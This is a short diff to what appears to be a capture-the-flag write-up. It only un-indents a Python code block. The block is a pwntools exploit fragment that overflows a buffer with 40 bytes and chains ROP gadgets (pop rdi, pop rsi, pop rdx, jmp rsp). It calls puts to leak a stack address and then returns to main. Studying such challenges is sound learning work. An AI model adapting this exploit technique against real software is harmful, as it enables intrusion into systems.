@@ -55,25 +55,25 @@ Let's see what we have so far:
 
 Let's see how the exploit looks until here
 
-    ```python
-    from pwn import *
+```python
+from pwn import *
 
-    stack_end_sym_addr = p64(0x004bfa70)
+stack_end_sym_addr = p64(0x004bfa70)
 
-    io.recvuntil(" libc 😏")
-    io.clean()
+io.recvuntil(" libc 😏")
+io.clean()
 
-    payload = b'A' * 40
-    popRDIAddr = p64(0x40191a) #pop rdi; ret
-    popRSIAddr = p64(0x40f4de) # pop rsi ; ret
-    popRDXAddr = p64(0x40181f) # pop rdx ; ret
-    jmpRSPAddr = p64(0x463c43) # jmp rsp
+payload = b'A' * 40
+popRDIAddr = p64(0x40191a) #pop rdi; ret
+popRSIAddr = p64(0x40f4de) # pop rsi ; ret
+popRDXAddr = p64(0x40181f) # pop rdx ; ret
+jmpRSPAddr = p64(0x463c43) # jmp rsp
 
-    payload += popRDIAddr
-    payload += stack_end_sym_addr
-    payload += p64(0x00411bd0) #puts addr
-    payload += p64(0x00401e61) #main addr
+payload += popRDIAddr
+payload += stack_end_sym_addr
+payload += p64(0x00411bd0) #puts addr
+payload += p64(0x00401e61) #main addr
 
-    io.sendline(payload)
-    endAddrOfStack = u64(io.recvline().strip().ljust(8, b'\x00'))
-    ```
+io.sendline(payload)
+endAddrOfStack = u64(io.recvline().strip().ljust(8, b'\x00'))
+```
